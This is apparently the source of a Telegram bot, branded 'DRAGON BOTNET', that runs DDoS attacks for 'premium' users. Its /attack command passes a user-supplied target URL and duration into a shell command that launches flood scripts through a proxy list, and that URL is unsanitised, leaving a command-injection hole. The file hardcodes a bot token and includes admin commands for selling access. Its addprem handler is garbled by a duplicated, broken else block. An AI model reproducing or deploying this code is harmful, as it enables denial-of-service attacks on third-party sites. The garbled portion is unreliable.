const { Telegraf } = require('telegraf');
const fs = require('fs');
const { exec } = require('child_process');

// Initialize bot with your token
const bot = new Telegraf("7762846339:AAGzOirfjmxTYw14FK7fujiS05mPnwGHPBc");

// File paths
const PREMIUM_USERS_FILE = "premium_users.txt";
const PROXY_FILE = "proxy.txt";
const UA_FILE = "user-agents.txt";
const ADMIN_USER = "BorNo_SixNine";
let isAttackRunning = false;

// Methods for attacks
const METHODS = ["DRAGON", "TLS", "KILL"];

// Load premium users from file
const loadPremiumUsers = () => {
    if (!fs.existsSync(PREMIUM_USERS_FILE)) return new Set();
    const users = new Set(fs.readFileSync(PREMIUM_USERS_FILE, 'utf-8').split('\n').filter(Boolean));
    return users;
};

// Save premium users to file
const savePremiumUsers = (users) => {
    fs.writeFileSync(PREMIUM_USERS_FILE, Array.from(users).join('\n'));
};

// Load premium users at startup
let premiumUsers = loadPremiumUsers();

// Function to handle attack end
const endAttack = (chatId, url, duration) => {
    setTimeout(() => {
        isAttackRunning = false;
        bot.telegram.sendMessage(chatId, `Attack has ended on ${url}.`);
    }, duration * 1000);
};

// Loading animation
const sendLoadingAnimation = async (chatId) => {
    for (let i = 1; i <= 3; i++) {
        await bot.telegram.sendMessage(chatId, `Loading ${'.'.repeat(i)}`);
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
};

// Start message
bot.start(async (ctx) => {
    const chatId = ctx.chat.id;
    await sendLoadingAnimation(chatId);
    await new Promise(resolve => setTimeout(resolve, 3000));
    bot.telegram.sendMessage(chatId, `
>DRAGON | 𝗕𝗢𝗧𝗡ET
▬▭▬▭▬▭▬▭▬▭▬▭▬
Attack Command
- /attack
▬▭▬▭▬▭▬▭▬▭▬▭▬
Preparation Command
- /methods
- /updateproxy
- /proxycount
- /uacount
▬▭▬▭▬▭▬▭▬▭▬▭▬
Owner Command
- /addprem
- /delprem
▬▭▬▭▬▭▬▭▬▭▬▭▬
`);
});

// Handle the /methods command to display available methods
bot.command('methods', (ctx) => {
    bot.telegram.sendMessage(ctx.chat.id, `
>Available Methods:
▬▭▬▭▬▭▬▭▬▭▬▭▬
- DRAGON
- TLS
- KILL
▬▭▬▭▬▭▬▭▬▭▬▭▬
    `);
});

// Handle the /attack command
bot.command('attack', (ctx) => {
    if (!premiumUsers.has(ctx.from.username)) {
        return bot.telegram.sendMessage(ctx.chat.id, `
>Access Denied
▬▭▬▭▬▭▬▭▬▭▬▭▬
Only premium users can use the /attack command.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        `);
    }

    if (isAttackRunning) {
        return bot.telegram.sendMessage(ctx.chat.id, `
>Attack In Progress
▬▭▬▭▬▭▬▭▬▭▬▭▬
An attack is already running. Please wait for it to finish.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        `);
    }

    const args = ctx.message.text.split(' ');
    if (args.length !== 4) {
        return bot.telegram.sendMessage(ctx.chat.id, `
>Invalid Command
▬▭▬▭▬▭▬▭▬▭▬▭▬
Usage: /attack <method> <url> <time>
▬▭▬▭▬▭▬▭▬▭▬▭▬
        `);
    }

    const method = args[1].toUpperCase();
    const url = args[2];
    const duration = parseInt(args[3]);

    if (!METHODS.includes(method)) {
        return bot.telegram.sendMessage(ctx.chat.id, `
>Invalid Method
▬▭▬▭▬▭▬▭▬▭▬▭▬
Available methods: ${METHODS.join(', ')}
▬▭▬▭▬▭▬▭▬▭▬▭▬
        `);
    }

    if (duration > 120) {
        return bot.telegram.sendMessage(ctx.chat.id, `
>Duration Error
▬▭▬▭▬▭▬▭▬▭▬▭▬
The maximum allowed attack duration is 120 seconds.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        `);
    }

    isAttackRunning = true;
    bot.telegram.sendMessage(ctx.chat.id, "[❗]");

    const command = `node ${method}.js ${url} ${duration} 64 10 proxy.txt`;
    exec(command, (error, stdout, stderr) => {
        if (error) {
            isAttackRunning = false;
            return bot.telegram.sendMessage(ctx.chat.id, `
>Error Occurred
▬▭▬▭▬▭▬▭▬▭▬▭▬
${error.message}
▬▭▬▭▬▭▬▭▬▭▬▭▬
            `);
        }

        const startTime = new Date().toLocaleString();
        bot.telegram.sendMessage(ctx.chat.id, `
>Command Executed!
▬▭▬▭▬▭▬▭▬▭▬▭▬
Target: ${url}
Duration: ${duration} seconds
Method: ${method}
*Start Time:* ${startTime}
*Running Attacks:* 1/1
➖➖➖➖➖➖➖➖➖➖
*Owner : ( @${ADMIN_USER} )*
        `);

        endAttack(ctx.chat.id, url, duration);
    });
});

// Handle the /proxycount command
bot.command('proxycount', (ctx) => {
    if (fs.existsSync(PROXY_FILE)) {
        const proxies = fs.readFileSync(PROXY_FILE, 'utf-8').split('\n');
        const count = proxies.length;
        bot.telegram.sendMessage(ctx.chat.id, `
>Proxy Count
▬▭▬▭▬▭▬▭▬▭▬▭▬
Proxy Count: ${count}
▬▭▬▭▬▭▬▭▬▭▬▭▬
        `);
    } else {
        bot.telegram.sendMessage(ctx.chat.id, `
>Proxy File Missing
▬▭▬▭▬▭▬▭▬▭▬▭▬
The proxy file does not exist.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        `);
    }
});

// Handle the /uacount command
bot.command('uacount', (ctx) => {
    if (fs.existsSync(UA_FILE)) {
        const uas = fs.readFileSync(UA_FILE, 'utf-8').split('\n');
        const count = uas.length;
        bot.telegram.sendMessage(ctx.chat.id, `
>User-Agent Count
▬▭▬▭▬▭▬▭▬▭▬▭▬
User-Agent Count: ${count}
▬▭▬▭▬▭▬▭▬▭▬▭▬
        `);
    } else {
        bot.telegram.sendMessage(ctx.chat.id, `
>User-Agent File Missing
▬▭▬▭▬▭▬▭▬▭▬▭▬
The user-agent file does not exist.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        `);
    }
});

// Handle the /addprem command to add premium users (admin only)
bot.command('addprem', (ctx) => {
    if (ctx.from.username === ADMIN_USER) {
        const args = ctx.message.text.split(' ');
        if (args.length !== 2) {
            return bot.telegram.sendMessage(ctx.chat.id, `
>Invalid Command
▬▭▬▭▬▭▬▭▬▭▬▭▬
Usage: /addprem <username>
▬▭▬▭▬▭▬▭▬▭▬▭▬
            `);
        }

        const userToAdd = args[1];
        premiumUsers.add(userToAdd);
        savePremiumUsers(premiumUsers);
        bot.telegram.sendMessage(ctx.chat.id, `
>Premium User Added
▬▭▬▭▬▭▬▭▬▭▬▭▬
User ${userToAdd} added to premium users.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        `);
    } else {
        bot.telegram.sendMessage(ctx.chat.id, `
>Access Denied
▬▭▬▭▬▭▬
     } else {
    bot.telegram.sendMessage(ctx.chat.id, `
>Access Denied
▬▭▬▭▬▭▬▭▬▭▬▭▬
Only the admin can add premium users.
▬▭▬▭▬▭▬▭▬▭▬▭▬
    `);
}
});

// Handle the /delprem command to remove premium users (admin only)
bot.command('delprem', (ctx) => {
    if (ctx.from.username === ADMIN_USER) {
        const args = ctx.message.text.split(' ');
        if (args.length !== 2) {
            return bot.telegram.sendMessage(ctx.chat.id, `
>Invalid Command
▬▭▬▭▬▭▬▭▬▭▬▭▬
Usage: /delprem <username>
▬▭▬▭▬▭▬▭▬▭▬▭▬
            `);
        }

        const userToRemove = args[1];
        if (premiumUsers.has(userToRemove)) {
            premiumUsers.delete(userToRemove);
            savePremiumUsers(premiumUsers);
            bot.telegram.sendMessage(ctx.chat.id, `
>Premium User Removed
▬▭▬▭▬▭▬▭▬▭▬▭▬
User ${userToRemove} removed from premium users.
▬▭▬▭▬▭▬▭▬▭▬▭▬
            `);
        } else {
            bot.telegram.sendMessage(ctx.chat.id, `
>User Not Found
▬▭▬▭▬▭▬▭▬▭▬▭▬
User ${userToRemove} is not a premium user.
▬▭▬▭▬▭▬▭▬▭▬▭▬
            `);
        }
    } else {
        bot.telegram.sendMessage(ctx.chat.id, `
>Access Denied
▬▭▬▭▬▭▬▭▬▭▬▭▬
Only the admin can remove premium users.
▬▭▬▭▬▭▬▭▬▭▬▭▬
    `);
    }
});

// Start polling to listen to commands
bot.launch();